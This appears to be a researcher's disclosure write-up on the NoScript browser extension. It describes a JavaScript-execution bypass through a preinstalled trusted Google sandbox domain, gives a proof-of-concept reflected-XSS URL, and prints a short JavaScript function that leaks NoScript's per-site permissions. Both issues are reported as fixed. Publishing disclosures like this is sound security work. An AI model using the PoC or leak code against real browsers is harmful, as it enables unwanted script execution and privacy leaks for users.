title: NoScript part 2

See <https://ndevtk.github.io/writeups/2022/09/01/noscript/> for context about what NoScript is.

# Bypass to run Javascript

This extension comes preinstalled with a list of trusted websites where javascript is allowed to run, this includes `gstatic.com` that Google treats as a sandbox domain. <https://github.com/hackademix/noscript/blob/cc0471fe52a069b73b20b5e4213f54e8699a3052/src/bg/Settings.js#L218>

While my favorite `gstatic.com` XSS endpoint was over `postMessage` it wont work for this since I can't run javascript to send a message luckily the Google Security Team provided me with the location of a URL reflected XSS ðŸ™‚

PoC: <https://www.gstatic.com/vr/ads/playground/metrics.html#assetUrl=https://tinyurl.com/2yrfxf5a>

Normally on Firefox this would have been prevented by NoScript's anti-XSS protection however by reusing the iframe source XSS sink as a way to navigate to the XSS page in the embed it would be considered same-origin initiated which is exempt from the filter.

This anti-XSS bypass was fixed in <https://github.com/hackademix/noscript/commit/10e2c40c1ca55ee7482705c47d2b3ec41aded4f7> but the sandbox domain is still marked as trusted for compatibility.

May also be other ways to bypass NoScript since there's no way of knowing if code running on <https://code.earthengine.google.com/> or a sandboxed â€˜nullâ€™ origin iframe is safe.

...Ideally don't have any sandbox domains in your NoScript permissions or even better the least amount necessary, not the first time the default list has been vulnerable <https://thehackerblog.com/the-noscript-misnomer-why-should-i-trust-vjs-zendcdn-net/>

# Leaking the permissions of a cross-site URL

Yay XS-Leaks! (Mainly privacy concern)

```js
async function getPermissions(url) {
  const result = await fetch(
    'https://[ff00::]/nscl/chrome-extension://doojmbjmlfjjnbmnoijecmcbfeoakpjm/syncMessage?msg=' +
      encodeURIComponent(JSON.stringify({id: 'fetchChildPolicy', url: url}))
  );
  const body = await result.json();
  const chunk = JSON.parse(body.chunk);
  return chunk;
}
```
This was fixed in <https://github.com/hackademix/nscl/commit/c3fd029c9c08c472601dcff1fbc3c0edcaf98c27>

# Some other interesting behaviors

- Tries to implement its own version of CORS <https://github.com/hackademix/nscl/blob/9f59d8d823cc58b2a9c751b4db7715658b68cc67/service/prefetchCSSResources.js#L59>
- Hooks service worker registration <https://github.com/hackademix/nscl/blob/9f59d8d823cc58b2a9c751b4db7715658b68cc67/service/patchWorkers.js#L61>
